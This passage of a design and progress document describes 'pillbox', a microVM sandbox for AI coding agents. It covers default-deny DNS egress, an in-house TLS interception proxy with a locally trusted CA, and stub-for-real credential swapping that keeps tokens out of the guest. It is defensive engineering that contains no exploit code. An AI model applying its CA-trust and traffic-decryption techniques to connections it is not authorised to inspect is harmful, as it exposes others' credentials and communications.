    (libkrun eats the child's stderr; see the L5 phase notes below).
  - **L5 §0 + vault-v2 + egress** — a *phase*, sub-sliced. **STATUS: CLOSED** —
    substrate + security (env-fork) + observability (§0) all landed + live-verified
    (a real agent runs in the microVM with default-deny egress, owned TLS MITM, and
    its credential never in the guest). Reviewed (thermo-nuclear/simplify/code-review)
    + hardened: `mint_stub` body-leak guard, teardown-on-every-path, connect bound.
    **Consolidation pass done:** (a) ✅ `run()` extracted into `prepare_launch`
    (rootfs…VmSpec) + a ~90-line supervise orchestrator; (b) ✅ the L7 TLS pump
    split out of `egress.rs` into `mitm.rs` (egress.rs 462 / mitm.rs 229 / vault.rs
    392). Both behavior-preserving + re-verified live (smoltcp up, cred swaps, §0).
    **Done in L6:** (c) ✅ threaded/non-blocking upstream connect — `vault::
    spawn_connect` runs the 10s `connect_timeout` on its own thread and the pump
    polls an `mpsc::Receiver`, so a hung upstream no longer stalls the smoltcp
    poll loop (re-verified live: 12 swaps, 0 connect failures); (h) ✅ `--detach`
    + session reattach/kill — see the [L6 slice](#l6-detach--sessions) below.
    **Still deferred:** (d) response-side real→stub for mid-run token refresh
    (AnthropicProvider's bidirectional OAuth — the A1 single-player-persist /
    multiplayer-vault question); (e) the `--with --vault` API-key path
    (same `StubSwap`); (f) codex `*.chatgpt.com` wildcard in the DNS fence; (g)
    foreground session records (the sessions-organization polish). **Architecture:** the
    smoltcp egress stack runs in the **VMM child** (a thread alongside
    `start_enter`, netspike's shape), not the parent — `start_enter` is in the
    child. On macOS/HVF libkrun's default **TSI does not carry egress** (the L3
    `ConnectionRefused`), so smoltcp+virtio-net is the *only* egress path, not an
    optimization.
    **Direction decision (own the MITM; don't pin on hudsucker).** The vault is
    built on **smoltcp + rustls** in-repo, *not* by reusing the existing hudsucker
    proxy (a proxy-over-vsock reuse was considered + rejected). Reasons: (1)
    dep-health — hudsucker is a single-maintainer crate; smoltcp + rustls are
    well-supported; (2) own-the-substrate (the pivot's thesis); (3) this is the
    *go-forward* vault — hudsucker **retires with the legacy backends** (the
    deprecated-in-direction local Docker backend; the removed ssh/e2b ones are
    already gone), so there's no two-impls-forever tax, just a transition. The
    netspike spike already proved the hard half (rustls `ServerConnection` off the
    smoltcp poll loop + SNI parse + stub→real swap); what's reimplemented is what
    hudsucker did for us: cert forging (reuse the pillbox CA + `rcgen`), the HTTP
    swap, and the forward leg. **h2 risk + sidestep:** hand-rolling HTTP/2 rewrite
    is nasty (hyper gave it free) — so the MITM advertises **only `http/1.1` in
    its ALPN**, the guest negotiates down to h1 with *us* (we only parse h1 to
    swap), and we speak h1/h2 to the real upstream independently.
    **Two scopes — keep them separate:**
      - **Vault forward (bounded)** — terminate + swap + forward to the
        *allowlisted provider hosts* only. Tractable: open a host socket to the
        pinned provider IP and relay. This is L5b's core.
      - **General egress (arbitrary NAT)** — git/npm/MCP to *any* host. The hard
        userspace-NAT piece netspike never did; **deferrable**. The locked profile
        denies it (no route off the allowlist); standard/permissive's arbitrary
        NAT (or gvproxy/passt, or TSI if it turns out to work) is future work.
    Sub-slices:
      - **L5a egress transport + DNS fence ✅** — virtio-net in the VMM child →
        smoltcp `Device` + poll loop (`sandbox/libkrun/egress.rs`, graduated from
        netspike) + a DNS responder: allowlisted (the `known_secrets` provider
        hosts) → A=gateway + **pinned**; everything else → NXDOMAIN (default-deny
        at the name layer). Guest NIC configured via `ip` (added `iproute2` to the
        runner). **Live-verified** (`pillbox-runner:l5a`): claude resolved
        `api.anthropic.com` (pinned) and its telemetry/update hosts
        (`platform.claude.com`, `downloads.claude.ai`, datadog) were all fenced.
        *Two findings:* (1) **libkrun wires the guest console to the VMM child's
        stdio**, so the egress thread's stderr is swallowed — host-side egress
        diagnostics go to a file (`PILLBOX_KRUN_EGRESS_LOG`, carried via `VmSpec`
        past the child's `env_clear`) until L5c routes them as §0 events. (2) the
        allowlist holds `api.github.com`, so bare `github.com` is (correctly)
        fenced — the L5b allowlist should track the *vaulted secrets in play*, not
        a static provider list.
      - **L5b vault (own MITM)** — sub-sliced (large). **Reuse map** (from the
        vault evidence scan): the **CA is reused as-is** — the VMM child is a host
        process, so it loads `vault::ca::Ca::ensure(ca_dir)` + `.issuer()` from
        disk directly (the CA key never nears the guest; only the *path* travels
        in `VmSpec`). **Leaf minting is reimplemented** (hudsucker's
        `RcgenAuthority` owns it): rcgen `CertificateParams::new([sni]).signed_by(
        &issuer)` → a rustls `ServerConfig` (rustls **0.23**, match hudsucker's;
        aws-lc-rs provider; ALPN-pinned `http/1.1`). `Registry` / `mint_stub` /
        `rotate_real_field` / `snapshot_real` reuse as-is (pure Rust); the
        `anthropic.rs` swap is `Request<Body>`-coupled → extract as pure fns over
        parsed h1 headers + JSON. **Env fork channel:** real creds reach the child
        out-of-band (the `VaultStdinBlob` pattern), NOT the guest env; the guest
        gets stubs. The guest trusts the CA via `NODE_EXTRA_CA_CERTS` + the system
        bundle (no `HTTPS_PROXY` — we're transparent via the DNS redirect, not a
        proxy). Sub-slices:
          - **L5b-1 terminate + gate ✅** — TCP listener pool at the gateway:443
            (`egress.rs`) → rustls terminate (`vault.rs`: per-SNI leaf minted from
            the reused CA via a `ResolvesServerCert` that gates the allowlist at
            cert selection) → pin gate (SNI ∈ `PinTable`) in the pump. Guest trusts
            the CA via `NODE_EXTRA_CA_CERTS` + `update-ca-certificates`. Synthesizes
            a `200` (no forward yet). **Live-verified** (`pillbox-runner:l5a`): the
            guest trusted our leaf and we **decrypted claude's real requests** —
            `POST /v1/messages`, `/api/claude_cli/bootstrap`, `/v1/mcp_servers` —
            all `ALLOW sni=api.anthropic.com`, while the fence NXDOMAIN'd the rest.
            **Finding:** a raw multi-line CA PEM in the exec argv trips libkrun's
            cmdline encoder (`InvalidAscii` on the newlines) → base64 it single-line
            + `base64 -d` in the guest.
          - **L5b-2 forward leg ✅** — `Vault::connect_upstream` opens a *real*
            host socket to the pinned provider (host-resolved, cert validated
            against the Mozilla `webpki-roots`), and the egress pump drives the
            upstream rustls `ClientConnection` **in the same poll loop** (no
            threads), bridging decrypted bytes between the two TLS sessions
            transparently. **Live-verified** (`pillbox-runner:l5a`): claude's
            `POST /v1/messages` reached the real `api.anthropic.com` and a **real
            Anthropic response came back intact** (a genuine parsed `401`, which a
            synthesized relay couldn't produce). **Finding:** claude then hit
            `401 → run /login` because its OAuth/refresh hosts
            (`console.anthropic.com`, `platform.claude.com`) are **fenced** — the
            allowlist is api-only (`known_secrets`), so a stale token can't
            refresh. That's L5b-3's job (full provider host set + the swap).
          - **L5b-3a allowlist ✅** — the egress fence sources its allowlist from
            `providers::intercepted_hosts()` (added `hosts()` to the
            `VaultProvider` trait — Anthropic: api+console+platform), not api-only
            `known_secrets`. Verified: claude reaches `platform.claude.com` + issues
            a real `POST /v1/oauth/token` (was fenced).
          - **L5b-3b env-fork swap ✅** — the guest mounts **stubbed** creds (a CoW
            clone of the auth home with the OAuth access+refresh tokens replaced by
            stubs), the reals reach the child **out-of-band on stdin** (never the
            guest env/argv/VmSpec), and `vault::StubSwap` does a streaming byte
            substitution stub→real on the guest→upstream plaintext (auth-mode-
            agnostic; carries across TLS-record boundaries; unit-tested). **Live-
            verified** (fresh creds): claude completed a turn, `cred swapped` on all
            13 requests, and the guest's `.credentials.json` holds only
            `sk-ant-oat01-pllbxstub…` — **zero real-token body in the VM**.
            **Caught in verification:** the first `mint_stub` used `rsplit_once('-')`
            and leaked most of the real token into the stub (OAuth bodies contain
            hyphens) — fixed to keep only the fixed type prefix + a unit test.
          - **L5b-3 hardening** — ✅ **clone cleanup**: `run()` removes the CoW
            `creds/`+`ws/` clones on exit (verified: 0 left after a clean
            `--version` run; only SIGKILL'd test runs skip it). ✅ **IP-level pin
            is inherent** to the MITM-forward model — `connect_upstream` resolves
            the *pinned SNI host* itself and forwards to that real IP; there's no
            arbitrary-dst NAT to pin (the netspike IP-pin was for a NAT model).
            *Still deferred:* **response-side real→stub** (a token *refresh*
            mid-run returns real tokens the guest then stores — re-leaks until the
            response is stubbed too; fresh-creds short runs don't trigger it; this
            is the AnthropicProvider's bidirectional OAuth logic) and the
            **`--with --vault` API-key path** (reuse the same `StubSwap`; needs the
            secret-resolution-with-`VaultMeta` integration + unblock `--vault`).
      - **L5c §0 producer ✅** — no 2nd vsock port needed: the agent writes its
        transcript into the RW-mounted home, so it lands in the **host-side CoW
        creds clone**, and `run()` tails it into the durable `SessionLog` via the
        reused `spawn_session_observability` (the same producer docker/ssh use).
        **Live-verified:** the log filled with the conversation (`message_start`/
        `delta`/`end`, user + assistant) — what `session watch`/`subscribe`
        consume. `proxy_active=false` (our MITM doesn't tap gen_ai usage, so the
        transcript stays the usage source).
  - <a name="l6-detach--sessions"></a>✅ **L6 `--detach` + sessions** — a libkrun
    run can be backgrounded and reattached, **including vaulted** (unlike local
    docker `--detach`, where the host-side proxy can't outlive the CLI). This
    works *because the MITM lives in the VMM child, not the parent* — the parent
    can return while the child keeps the agent + egress stack + vault alive.
    - **Attach direction flips for detach.** Foreground = **guest dials host**
      (`krun_add_vsock_port`; parent binds+accepts before boot → no race). Detach
      = **guest listens** (`krun_add_vsock_port2(port, host_sock, listen=true)`;
      libkrun binds a *persistent* unix socket the reattaching pillbox dials).
      The L4 race (port2 raced the foreground initial attach) doesn't recur:
      reattach happens when the guest is already up, so there's nothing to race.
      `prepare_launch` splices `--vsock-listen` into the guest pty-host command +
      sets `VsockAttach.listen` when `opts.detach`; `pty-host --vsock-listen`
      (`attach/host.rs`) binds `AF_VSOCK`/`VMADDR_CID_ANY` and serves an accept
      loop (a dropped client doesn't kill the live agent).
    - **`run_detached`** persists the `VmSpec` tempfile (the child reads it *after*
      the parent returns), spawns the `__krun-vmm` child with null stdio (don't
      wait — it reparents to init), pipes the real creds to its stdin (the
      env-fork channel, unchanged), and writes a `Session` whose `sandbox_id` is a
      JSON `LibkrunHandle { sock, pid, creds, workspace, spec }`. No cleanup on
      return — the child owns the VM.
    - **`reattach`** decodes the handle, `UnixStream::connect`s the persistent
      sock, and runs the normal `pump::attach_terminal` (detach-enabled). **`kill_
      session`** `SIGKILL`s `handle.pid` + scrubs the sock/spec/creds/workspace
      clones + drops the record. Dispatched from `commands/session.rs`
      (`Backend::Libkrun` arms, cfg-gated).
    - **Live-verified** (`pillbox-runner:l6`): `run --detach` returned immediately
      with a live VMM child; `session list` showed `running/detached`; `session
      attach` connected over the port2-listen sock and rendered claude's UI **with
      the agent's reply** (so the detached VM booted claude *and authenticated
      through the in-child MITM* — the env-fork works detached); `Ctrl-A D`
      detached cleanly leaving the child alive; `session rm` killed the child +
      dropped the record. **Skew note:** the runner's in-guest pillbox must have
      `--vsock-listen` — an older image fails detach (rebuild the runner when the
      launch protocol changes — a version-skew preflight catches this).
    **Env fork — secrets go to the vault, not the VM env** (lands with L5b; this is
    the whole point of vault-v2; a secret in the VM's env is readable by the
    agent via `/proc/self/environ` and exfiltrable by a prompt injection). L3
    injects everything directly (matches Docker's non-vault path) only because
    the egress stack to swap at doesn't exist yet; L5 splits it:
      - **config (non-secret)** → directly into the VM env (fine).
      - **vaultable secret** (known destination — provider keys, or a custom one
        with `--host`/`--header-scheme`/`--maps-to`) → real value in the host
        vault registry; the VM env gets a **stub**; the smoltcp egress swaps
        stub→real only on a DNS-pinned, TLS-verified request to the allowlisted
        host. The agent never holds the real value.
      - **non-vaultable secret** → direct (with a warning), but **default-deny
        egress is the backstop** — a leaked stub or a real value can't reach a
        non-allowlisted host. Lean harder than Docker toward **stubs-only in the
        VM**: nudge users to `--host`/`--maps-to` so a secret *can* be vaulted.
    Owning the egress (smoltcp) is what makes default-deny structural — Docker's
    vault passed unmatched hosts through. Then step 7 (opencode seam) + step 8.

7. **opencode** — bring `Integration::Server` onto the libkrun substrate. This is
   the strategic move (not just a transport repoint): opencode's `serve` mode is a
   cleaner substrate than claude/codex — a real prompt API + a structured `/event`
   stream, no PTY-scrape — which is exactly what the gateway (sequencer/broker) and
   the optimization loops (ACE/GEPA over the event stream) consume, and where the
   multiplayer + DSPy/GEPA/RLM layer *above* opencode is the daylight.
   - ✅ **7a — `Integration` as the typed dispatch axis** (`563a00e`). Replaced the
     stringly `is_server_agent` scatter with `Session::integration()` (derived from
     the registry, not stored — no derivable-state dup); exhaustive typed checks at
     send/subscribe/watch.
   - ✅ **7b/7c-1 — the transport seam** (`563a00e`/`d4a85da`). Not "run a command"
     (docker parity is no reason — docker dies at step 8) but **`SandboxHttp`**
     (`request` + `open_stream`): the use cases want HTTP to the in-guest server
     (proxy the API, fan `/event` out to remote participants). `sandbox/opencode.rs`
     speaks HTTP; docker realizes it via `docker exec curl`, libkrun via a real
     client. The `message.*` mapper + `drain_sse` survive unchanged.
   - ✅ **7c-2/7c-3 — libkrun over an HTTP-vsock forward** (`121104f`). Guest
     `pillbox vsock-forward` bridges a vsock port → `127.0.0.1:4096` (exposes ONLY
     the opencode port, no exec surface; reuses the detach port2-listen mechanism);
     host `LibkrunHttp` speaks HTTP/1.1 over it (de-chunks the `/event` SSE — curl
     hid the chunking on docker). `run_server` boots `opencode serve` + the relay
     (creds CoW-cloned **unstubbed** — opencode is non-vault; the MITM forwards
     allowlisted hosts with an empty swap), brings it up, records the Session.
     **Verified live** (`pillbox-runner:l7`): opencode booted in the µVM; the host
     drove it over the forward (`/doc` 200, `/session`→`ses_`, `/prompt_async` 204,
     multi-connection vsock); `session list`/`rm` work.
   - ✅ **standard egress profile** (`bbfe66a`). opencode is non-vault and reaches
     its provider directly, but the fence only allowed the vault-intercepted hosts.
     `egress::standard_egress_hosts()` (openrouter/deepseek/kimi/grok/gemini/glm/
     mistral/groq + `models.dev`) unions into the server-path allowlist; the MITM
     terminates + forwards them with an **empty swap** (opencode holds its own
     key). **This settled the `/event` render** — never a pipeline bug, just the
     fenced model leaving no real turn. **Verified end-to-end:** `run --agent
     opencode` (GLM) → `session send` → `session watch` rendered the reply
     *streaming* through §0 (`open_stream` de-chunk → `drain_sse` → `SessionLog`,
     59 events), egress log showing `POST …/chat/completions → api.z.ai
     (forwarding)`. Follow-up: a `--egress-allow HOST` flag for custom endpoints.
   - ✅ **7d + first-class finish** (`db87d61`). Folded the opencode-only Session
     fields into `Session.server: Option<ServerSession>` (typed both-or-neither, no
     more `None, None` tail). Added **`--egress-allow HOST`** (invoker escape hatch
     for a custom/self-hosted endpoint; threads into both libkrun allowlists, no-op
     on docker). Extracted the shared `opencode::print_started` banner; the
     `run_server` bodies stay per-backend (docker container vs libkrun VMM lifecycle
     genuinely differ — the shared bring-up is already in the `opencode::` fns).
     Verified live (the 7d server-record round-trips through run→send→watch).
   - ✅ **ready-not-prompted** (`4162fe3`). `run --agent opencode` no longer
     auto-sends an initial prompt — it brings up a *ready* session (wait_ready) and
     returns; the first prompt goes through `session send` like every other turn,
     so it's captured by a subscribed `watch` instead of streamed to no one at
     start. (Auto-send was a PTY-readiness workaround; opencode's `/doc` makes it
     moot — and it was the source of the first-turn-not-captured gap.) A passed
     prompt pre-fills the send hint.
   - ✅ **complete, gateway-free §0** (`ef758a5`). The trace log is the substrate
     the **meta-harness** (DSPy/GEPA/RLM) consumes, so it must be complete *and*
     captured with no daemon. The live `/event` bridge only captured while
     watched; fixed to the PTY-agent shape — the libkrun guest appends raw `/event`
     SSE to a persistent file in the shared/CoW home (`EVENTS_FILE`), and the host
     drains it on `watch`/`subscribe` via a `FollowReader` (blocks at EOF, `tail
     -F`) + the existing `drain_sse` (replay + follow). A late watcher gets the
     full history; nothing outlives `run`. Gotcha: a long-lived `curl -sN` holds
     the file open so virtio-fs never flushes — re-open per line (`read | printf >>
     file`) forces it. **Verified:** a turn sent *unwatched* was fully captured +
     replayed to a late watcher. (docker, deprecated, keeps the live bridge.)
   - **opencode is now first-class alongside claude/codex** on both docker and
     libkrun: run (→ ready) / drive (`session send`) / read (`watch`/`subscribe`,
     complete capture) / teardown, any model provider via the standard profile +
     `--egress-allow`. This closes substrate primitive #1 (complete persisted
     traces) — the meta-harness's next gate is the **verifiable reward channel**.
8. **Deprecate Docker** — remove the Docker backend once libkrun is at parity (the remote backends are already gone).

## Dependencies

- [libkrun](https://github.com/containers/libkrun) — the microVM library we FFI
  (LGPL) + its `libkrunfw` kernel artifact.
- [smoltcp](https://github.com/smoltcp-rs/smoltcp) — the userspace TCP/IP stack
  crate for the egress termination point.
- [rustls](https://github.com/rustls/rustls) — TLS for the MITM termination.

## Prior art

Other libkrun-based agent sandboxes, for readers comparing approaches:
[microsandbox](https://github.com/microsandbox/microsandbox),
[brood-box](https://github.com/stacklok/brood-box),
[krunai](https://github.com/slp/krunai). pillbox's substrate, vault, and
§0/attach layers are its own design and implementation; these are credited as
related work in the space, not sources we vendor or fork.
